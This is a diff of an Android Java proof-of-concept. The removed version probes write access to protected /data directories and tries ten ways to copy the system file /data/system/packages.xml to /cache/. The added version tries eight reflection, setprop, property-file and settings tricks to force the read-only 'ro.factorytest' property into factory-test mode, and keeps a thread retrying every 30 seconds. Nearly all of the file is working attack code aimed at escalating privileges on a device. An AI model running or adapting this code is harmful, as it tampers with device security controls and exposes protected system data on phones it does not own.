@@ -1,236 +1,206 @@
 package com.poc;
 
+import android.os.FactoryTest;
+import android.os.Process;
 import java.io.*;
-import java.nio.ByteBuffer;
-import java.nio.MappedByteBuffer;
-import java.nio.channels.FileChannel;
-import java.nio.file.Files;
-import java.nio.file.Paths;
-import java.nio.file.StandardCopyOption;
-import java.util.*;
-import java.util.concurrent.atomic.AtomicInteger;
-import java.util.zip.ZipEntry;
-import java.util.zip.ZipOutputStream;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
 
 public class Main {
-    private static final String TAG = "PocExplorer";
-    private static final String DUMP_DIR = "/cache/";
-    private static final String PACKAGES_XML = "/data/system/packages.xml";
+    private static final String TAG = "PocFactory";
+    private static final String TARGET_PROP = "ro.factorytest";
+    private static final String TARGET_VALUE = "1";
+    private static final long RETRY_INTERVAL_MS = 30000;
 
     public static void main(String[] args) throws Exception {
-        int uid = android.os.Process.myUid();
-        System.out.println("=== uid=" + uid + " ===");
+        System.out.println("=== uid=" + Process.myUid() + " ===");
         System.out.println("SELinux context: " + getSelinuxContext());
+        System.out.println("[*] Original FactoryTest.getMode() = " + FactoryTest.getMode());
 
-        testUidChange(); 
-        testWriteToData(); 
-        dumpPackagesXml();  
-        printProcessGroups();
-    }
+        boolean success = tryAllMethods();
 
+        System.out.println("[*] After attempts, FactoryTest.getMode() = " + FactoryTest.getMode());
 
-    private static void testUidChange() {
-        System.out.println("\n[Mission1] Attempting to change UID/GID (via shell commands only)");
-
-        
-        try {
-            Process p = Runtime.getRuntime().exec("pm list packages");
-            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
-            String line;
-            System.out.println("--- pm list packages (sample) ---");
-            int count = 0;
-            while ((line = in.readLine()) != null && count++ < 10) {
-                System.out.println(line);
-            }
-            in.close();
-            p.waitFor();
-        } catch (Exception e) {
-            System.out.println("pm list packages error: " + e);
+        if (!success) {
+            System.out.println("[*] Starting persistent retry thread...");
+            startRetryThread();
         }
 
+        while (true) {
+            Thread.sleep(60000);
+        }
+    }
+
+    private static boolean tryAllMethods() {
+        boolean ok = false;
+        ok |= method1_SystemProperties_set();
+        ok |= method2_RoSystemProperties_reflection();
+        ok |= method3_FactoryTest_reflection();
+        ok |= method4_setprop_command();
+        ok |= method5_dev_properties_write();
+        ok |= method6_settings_put();
+        ok |= method7_persist_property();
+        ok |= method8_hijack_factorytest();
+        return ok;
+    }
+
+    private static boolean method1_SystemProperties_set() {
         try {
-            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "settings list global"});
+            Class<?> sp = Class.forName("android.os.SystemProperties");
+            Method set = sp.getMethod("set", String.class, String.class);
+            set.setAccessible(true);
+            set.invoke(null, TARGET_PROP, TARGET_VALUE);
+            System.out.println("[+] Method1: SystemProperties.set invoked");
+            return true;
+        } catch (Exception e) {
+            System.out.println("[-] Method1 failed: " + e.getMessage());
+            return false;
+        }
+    }
+
+    private static boolean method2_RoSystemProperties_reflection() {
+        try {
+            Class<?> ro = Class.forName("com.android.internal.os.RoSystemProperties");
+            Field field = ro.getDeclaredField("FACTORYTEST");
+            field.setAccessible(true);
+            Field mod = Field.class.getDeclaredField("modifiers");
+            mod.setAccessible(true);
+            mod.setInt(field, field.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
+            field.setInt(null, 1);
+            System.out.println("[+] Method2: RoSystemProperties.FACTORYTEST = 1");
+            return true;
+        } catch (Exception e) {
+            System.out.println("[-] Method2 failed: " + e.getMessage());
+            return false;
+        }
+    }
+
+    private static boolean method3_FactoryTest_reflection() {
+        try {
+            Class<?> ft = Class.forName("android.os.FactoryTest");
+            for (Field f : ft.getDeclaredFields()) {
+                if (f.getType() == int.class && f.getName().contains("MODE")) {
+                    f.setAccessible(true);
+                    f.setInt(null, 1);
+                    System.out.println("[+] Method3: Set " + f.getName() + " = 1");
+                    return true;
+                }
+            }
+        } catch (Exception e) {
+            System.out.println("[-] Method3 failed: " + e);
+        }
+        return false;
+    }
+
+    private static boolean method4_setprop_command() {
+        try {
+            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "setprop " + TARGET_PROP + " " + TARGET_VALUE});
             p.waitFor();
             if (p.exitValue() == 0) {
-                System.out.println("[OK] settings");
-            } else {
-                System.out.println("[FAIL] settings command failed");
+                System.out.println("[+] Method4: setprop succeeded");
+                return true;
             }
         } catch (Exception e) {
-            System.out.println("settings command error: " + e);
+            System.out.println("[-] Method4 failed: " + e);
         }
-
-        System.out.println("UID/GID change is likely blocked by SELinux and signature checks.");
+        return false;
     }
 
-    private static void testWriteToData() {
-        System.out.println("\n[Mission2] Writing test files to /data/ subdirectories");
-        String[] dirs = {
-            "/data",
-            "/data/misc",
-            "/data/system",
-            "/data/app",
-            "/data/data/com.android.bluetooth",
-            "/data/cache",
-            "/data/user/0",
-            "/data/media",
-            "/data/dalvik-cache",
-            "/data/resource-cache",
-            "/data/property",
-            "/data/"
+    private static boolean method5_dev_properties_write() {
+        String[] paths = {
+            "/dev/__properties__/property_info",
+            "/dev/__properties__/properties_serial",
+            "/dev/__properties__/u:object_r:exported_default_prop:s0"
         };
+        for (String p : paths) {
+            try (FileOutputStream fos = new FileOutputStream(p, true)) {
+                fos.write((TARGET_PROP + "=" + TARGET_VALUE + "\n").getBytes());
+                fos.flush();
+                System.out.println("[+] Method5: Wrote to " + p);
+                return true;
+            } catch (Exception ignored) {}
+        }
+        System.out.println("[-] Method5 failed");
+        return false;
+    }
 
-        List<WriteMethod> methods = new ArrayList<>();
-        methods.add(new WriteMethod("FileOutputStream", (path, name) -> {
-            try (FileOutputStream fos = new FileOutputStream(new File(path, name))) {
-                fos.write("test".getBytes()); return true;
-            } catch (Exception e) { return false; }
-        }));
-        methods.add(new WriteMethod("BufferedWriter", (path, name) -> {
-            try (BufferedWriter w = new BufferedWriter(new FileWriter(new File(path, name)))) {
-                w.write("test"); return true;
-            } catch (Exception e) { return false; }
-        }));
-        methods.add(new WriteMethod("FileChannel", (path, name) -> {
-            try (FileChannel ch = new FileOutputStream(new File(path, name)).getChannel()) {
-                ch.write(ByteBuffer.wrap("test".getBytes())); return true;
-            } catch (Exception e) { return false; }
-        }));
-        methods.add(new WriteMethod("RandomAccessFile", (path, name) -> {
-            try (RandomAccessFile raf = new RandomAccessFile(new File(path, name), "rw")) {
-                raf.write("test".getBytes()); return true;
-            } catch (Exception e) { return false; }
-        }));
-        methods.add(new WriteMethod("NIO Files.write", (path, name) -> {
-            try { Files.write(Paths.get(path, name), "test".getBytes()); return true; } catch (Exception e) { return false; }
-        }));
-        methods.add(new WriteMethod("Files.createFile+write", (path, name) -> {
-            try { java.nio.file.Path p = Paths.get(path, name); Files.createFile(p); Files.write(p, "test".getBytes()); return true; } catch (Exception e) { return false; }
-        }));
-        methods.add(new WriteMethod("MappedByteBuffer", (path, name) -> {
-            try (RandomAccessFile raf = new RandomAccessFile(new File(path, name), "rw")) {
-                MappedByteBuffer map = raf.getChannel().map(FileChannel.MapMode.READ_WRITE, 0, 4);
-                map.put("test".getBytes()); return true;
-            } catch (Exception e) { return false; }
-        }));
-        methods.add(new WriteMethod("Process echo", (path, name) -> {
-            try { Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "echo test > " + path + "/" + name}); p.waitFor(); return p.exitValue() == 0; } catch (Exception e) { return false; }
-        }));
-        methods.add(new WriteMethod("Process cat", (path, name) -> {
-            try { Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "echo test | cat > " + path + "/" + name}); p.waitFor(); return p.exitValue() == 0; } catch (Exception e) { return false; }
-        }));
-        methods.add(new WriteMethod("Process dd", (path, name) -> {
-            try { Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "echo test | dd of=" + path + "/" + name}); p.waitFor(); return p.exitValue() == 0; } catch (Exception e) { return false; }
-        }));
-
-        AtomicInteger total = new AtomicInteger(0);
-        AtomicInteger success = new AtomicInteger(0);
-        for (WriteMethod m : methods) {
-            for (String dir : dirs) {
-                String fileName = "test_" + System.currentTimeMillis() + "_" + total.incrementAndGet() + ".txt";
-                boolean ok = m.method.apply(dir, fileName);
-                if (ok) {
-                    success.incrementAndGet();
-                    System.out.println("[OK] " + m.name + " -> " + dir + "/" + fileName);
-                    new File(dir, fileName).delete();
-                } else {
-                    System.out.println("[FAIL] " + m.name + " -> " + dir);
+    private static boolean method6_settings_put() {
+        for (String ns : new String[]{"global", "secure"}) {
+            try {
+                Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "settings put " + ns + " factorytest 1"});
+                p.waitFor();
+                if (p.exitValue() == 0) {
+                    System.out.println("[+] Method6: settings put " + ns + " succeeded");
+                    return true;
                 }
+            } catch (Exception e) {
+                System.out.println("[-] Method6 failed: " + e);
             }
         }
-        System.out.printf("Write test completed: %d/%d succeeded%n", success.get(), total.get());
+        return false;
     }
 
-    // ========== ミッション3: packages.xml を /cache/ にダンプ ==========
-    private static void dumpPackagesXml() {
-        System.out.println("\n[Mission3] Dumping /data/system/packages.xml to /cache/");
-        String src = PACKAGES_XML;
-        File srcFile = new File(src);
-        if (!srcFile.exists() || !srcFile.canRead()) {
-            System.err.println("Source file not accessible!");
-            return;
+    private static boolean method7_persist_property() {
+        try {
+            Class<?> sp = Class.forName("android.os.SystemProperties");
+            Method set = sp.getMethod("set", String.class, String.class);
+            set.setAccessible(true);
+            set.invoke(null, "persist.sys.factorytest", "1");
+            System.out.println("[+] Method7: persist.sys.factorytest = 1");
+            return true;
+        } catch (Exception e) {
+            System.out.println("[-] Method7 failed: " + e);
+            return false;
         }
-        List<DumpMethod> methods = new ArrayList<>();
-        methods.add(new DumpMethod("FileInputStream+FileOutputStream", () -> {
-            try (FileInputStream fis = new FileInputStream(src); FileOutputStream fos = new FileOutputStream(DUMP_DIR + "dump_fis_fos.xml")) {
-                byte[] buf = new byte[8192]; int len; while ((len = fis.read(buf)) > 0) fos.write(buf, 0, len); return true;
-            } catch (Exception e) { return false; }
-        }));
-        methods.add(new DumpMethod("FileChannel.transferTo", () -> {
-            try (FileInputStream fis = new FileInputStream(src); FileOutputStream fos = new FileOutputStream(DUMP_DIR + "dump_transfer.xml")) {
-                fis.getChannel().transferTo(0, Long.MAX_VALUE, fos.getChannel()); return true;
-            } catch (Exception e) { return false; }
-        }));
-        methods.add(new DumpMethod("Files.copy", () -> {
-            try { Files.copy(Paths.get(src), Paths.get(DUMP_DIR, "dump_files_copy.xml"), StandardCopyOption.REPLACE_EXISTING); return true; } catch (Exception e) { return false; }
-        }));
-        methods.add(new DumpMethod("BufferedReader+BufferedWriter", () -> {
-            try (BufferedReader br = new BufferedReader(new FileReader(src)); BufferedWriter bw = new BufferedWriter(new FileWriter(DUMP_DIR + "dump_br_bw.xml"))) {
-                String line; while ((line = br.readLine()) != null) { bw.write(line); bw.newLine(); } return true;
-            } catch (Exception e) { return false; }
-        }));
-        methods.add(new DumpMethod("Scanner+PrintWriter", () -> {
-            try (Scanner sc = new Scanner(new File(src)); PrintWriter pw = new PrintWriter(DUMP_DIR + "dump_scanner.xml")) {
-                while (sc.hasNextLine()) pw.println(sc.nextLine()); return true;
-            } catch (Exception e) { return false; }
-        }));
-        methods.add(new DumpMethod("Process cp", () -> {
-            try { Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/cp", src, DUMP_DIR + "dump_cp.xml"}); p.waitFor(); return p.exitValue() == 0; } catch (Exception e) { return false; }
-        }));
-        methods.add(new DumpMethod("Process cat", () -> {
-            try { Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "cat " + src + " > " + DUMP_DIR + "dump_cat.xml"}); p.waitFor(); return p.exitValue() == 0; } catch (Exception e) { return false; }
-        }));
-        methods.add(new DumpMethod("Process dd", () -> {
-            try { Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "dd if=" + src + " of=" + DUMP_DIR + "dump_dd.xml"}); p.waitFor(); return p.exitValue() == 0; } catch (Exception e) { return false; }
-        }));
-        methods.add(new DumpMethod("MappedByteBuffer read+write", () -> {
-            try (RandomAccessFile raf = new RandomAccessFile(src, "r"); FileChannel in = raf.getChannel();
-                 RandomAccessFile outRaf = new RandomAccessFile(DUMP_DIR + "dump_mapped.xml", "rw"); FileChannel out = outRaf.getChannel()) {
-                MappedByteBuffer map = in.map(FileChannel.MapMode.READ_ONLY, 0, in.size());
-                out.write(map); return true;
-            } catch (Exception e) { return false; }
-        }));
-        methods.add(new DumpMethod("ZipOutputStream (compress)", () -> {
-            try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(DUMP_DIR + "dump_packages.zip"))) {
-                zos.putNextEntry(new ZipEntry("packages.xml"));
-                try (FileInputStream fis = new FileInputStream(src)) {
-                    byte[] buf = new byte[8192]; int len; while ((len = fis.read(buf)) > 0) zos.write(buf, 0, len);
-                }
-                zos.closeEntry(); return true;
-            } catch (Exception e) { return false; }
-        }));
+    }
 
-        int total = methods.size(), ok = 0;
-        for (DumpMethod m : methods) {
-            if (m.method.run()) { ok++; System.out.println("[OK] " + m.name); } else { System.out.println("[FAIL] " + m.name); }
+    private static boolean method8_hijack_factorytest() {
+        try {
+            Class<?> ro = Class.forName("com.android.internal.os.RoSystemProperties");
+            Field field = ro.getDeclaredField("FACTORYTEST");
+            field.setAccessible(true);
+            Field mod = Field.class.getDeclaredField("modifiers");
+            mod.setAccessible(true);
+            mod.setInt(field, field.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
+            field.setInt(null, 1);
+
+            int mode = FactoryTest.getMode();
+            if (mode == 1) {
+                System.out.println("[+] Method8: FactoryTest.getMode() now returns 1!");
+                return true;
+            } else {
+                System.out.println("[-] Method8: FactoryTest.getMode() still " + mode);
+                return false;
+            }
+        } catch (Exception e) {
+            System.out.println("[-] Method8 failed: " + e);
+            return false;
         }
-        System.out.printf("Dump test completed: %d/%d succeeded%n", ok, total);
+    }
+
+    private static void startRetryThread() {
+        Thread t = new Thread(() -> {
+            while (true) {
+                try {
+                    Thread.sleep(RETRY_INTERVAL_MS);
+                    System.out.println("[*] Retrying factorytest hijack...");
+                    tryAllMethods();
+                } catch (InterruptedException e) {
+                    break;
+                }
+            }
+        });
+        t.setDaemon(false);
+        t.start();
+        System.out.println("[+] Retry thread started.");
     }
 
     private static String getSelinuxContext() {
-        try {
-            byte[] bytes = new byte[1024];
-            try (FileInputStream fis = new FileInputStream("/proc/self/attr/current")) {
-                int len = fis.read(bytes);
-                if (len > 0) return new String(bytes, 0, len).trim();
-            }
+        try (FileInputStream fis = new FileInputStream("/proc/self/attr/current")) {
+            byte[] b = new byte[1024];
+            int len = fis.read(b);
+            if (len > 0) return new String(b, 0, len).trim();
         } catch (Exception ignored) {}
         return "unknown";
     }
-
-    private static void printProcessGroups() {
-        try (BufferedReader r = new BufferedReader(new FileReader("/proc/self/status"))) {
-            String line;
-            while ((line = r.readLine()) != null) {
-                if (line.startsWith("Gid:") || line.startsWith("Groups:")) {
-                    System.out.println(line);
-                }
-            }
-        } catch (Exception ignored) {}
-    }
-
-    static class WriteMethod { String name; WriteFunction method; WriteMethod(String n, WriteFunction f) { name=n; method=f; } }
-    interface WriteFunction { boolean apply(String path, String filename); }
-    static class DumpMethod { String name; DumpFunction method; DumpMethod(String n, DumpFunction f) { name=n; method=f; } }
-    interface DumpFunction { boolean run(); }
 }
